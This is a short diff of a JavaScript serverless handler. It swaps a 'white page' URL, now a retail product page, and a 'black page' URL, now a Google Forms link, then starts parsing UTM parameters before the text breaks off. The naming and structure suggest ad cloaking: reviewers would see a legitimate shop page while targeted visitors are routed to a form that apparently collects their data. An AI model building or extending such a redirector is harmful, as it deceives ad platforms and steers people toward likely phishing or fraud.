@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.charleskeith.eu/lt/CK1-90900139_BLACK.html";
-    const blackPageURL = "https://docs.google.com/forms/d/e/1FAIpQLSdBJrMvgpXkI0pKbmUduysMZjl74QvSVW3NZfiFn4FMyyaL1g/viewform?usp=dialog";
+    const whitePageURL = "https://www.houseoffraser.co.uk/brand/ted-baker/ted-kingfrd-ss-shirt-sn99-558028#colcode=55802801";
+    const blackPageURL = "https://docs.google.com/forms/d/e/1FAIpQLScw0j1mVYgAXEmwy0PjnCN3-L9xfrZFGJXHpiedCHaBxfqwAQ/viewform?usp=dialog";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
